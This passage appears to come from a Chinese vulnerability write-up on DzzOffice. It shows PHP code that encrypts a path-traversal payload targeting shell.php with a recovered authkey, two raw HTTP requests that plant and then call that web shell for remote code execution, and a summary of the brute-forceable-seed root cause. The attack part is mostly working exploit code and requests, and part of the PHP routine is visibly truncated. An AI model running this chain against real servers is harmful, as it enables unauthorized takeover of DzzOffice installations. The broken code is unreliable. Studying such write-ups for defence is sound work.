        return false;
    }
    function authcode_decode($string, $key) {
        $key = md5($key);
        $ckey_length = 4;
        $keya = md5(substr($key, 0, 16));
        $keyc = substr($string, 0, $ckey_length);
        $cryptkey = $cryptkey = $keya . md5($keya . $keyc);
        $key_length = strlen($cryptkey);
        $string = base64_decode(substr(str_replace(array('_', '-'), array('/', '+'), $string), $ckey_length));
        $string_length = strlen($string);
        $result = '';
        $box = range(0, 255);
        $rndkey = array();
        for ($i = 0; $i  0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
    return substr($result, 26);
    } else {
    return '';
    }
    } else {
    return $keyc.str_replace('=', '', base64_encode($result));
    }
    }
    echo base64_encode(authcode_config("disk::..././..././..././shell.php",md5('3ccd48TRC0BU9NnD'),'ENCODE'));
构造数据包
    POST /dzz/core/api/wopi/index.php?access_token=1&action=contents&path=Y2RhNUl5N09ZVW8vaGNkV0tEcU1qZzc0bGtLWGlIVXZEdjY3eUxmaXFiR3k1VDhtNUJXSFZnZHF1Y3I1VGZCcmtDNXljVGJaMVFnSWlNVENzR1U= HTTP/1.1
    Host: localhost
    sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
    sec-ch-ua-mobile: ?0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Sec-Fetch-Site: none
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: gGyk_2132_saltkey=xkBk27da; gGyk_2132_lastvisit=1658359791; gGyk_2132_sid=T09ZLe; gGyk_2132_lastact=1658363412%09misc.php%09seccode; gGyk_2132_seccodeST09ZLe0=2121YXrez2Rb_00AasW9CQZdtAIM2HTcnua-PmShhMGHLfrWTtXnAkbq42XcqrY94rVDphUTYWnaK9OX9m0
    Connection: close
    Content-Length: 18
    Content-Type: application/x-www-form-urlencoded
访问根目录的`shell.php`即可RCE
    POST /dzz/shell.php HTTP/1.1
    Host: localhost
    sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
    sec-ch-ua-mobile: ?0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Sec-Fetch-Site: none
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: gGyk_2132_saltkey=xkBk27da; gGyk_2132_lastvisit=1658359791; gGyk_2132_sid=T09ZLe; gGyk_2132_lastact=1658363412%09misc.php%09seccode; gGyk_2132_seccodeST09ZLe0=2121YXrez2Rb_00AasW9CQZdtAIM2HTcnua-PmShhMGHLfrWTtXnAkbq42XcqrY94rVDphUTYWnaK9OX9m0
    Connection: close
    Content-Length: 18
    Content-Type: application/x-www-form-urlencoded
# 总结
  * `DzzOffice`大量借用`dizcus`的代码，导致产生了相同的问题，即随机数种子可爆破，最终得到`authkey`，最终利用密码，加密参数进行RCE。
  * 漏洞产生点在`install/index.php`这个目录在安装之后就会被删除，因此在做代码审计过程中，应该注意任何一个文件
  * 不应该只有着一种漏洞，大量借用`dizcus`代码，后续可以通过该思路，寻找`dizcus`的历史漏洞，对该系统就行漏洞挖掘
  * 在复现该漏洞时在该项目的`github`的`Issus`里发现一处有意思的点：
感觉非常突兀，由于`defined`的限制，页面没法直接访问，但是要是能绕过Defend，是不是能直接前台文件包含呢，这样的话，我们利用远程文件包含，是不是就可以RCE？我不太明白这里代码的作用，也就没有深入的去挖掘，但是感觉很有利用的可能。
# 参考链接
  * 
  * 
  * 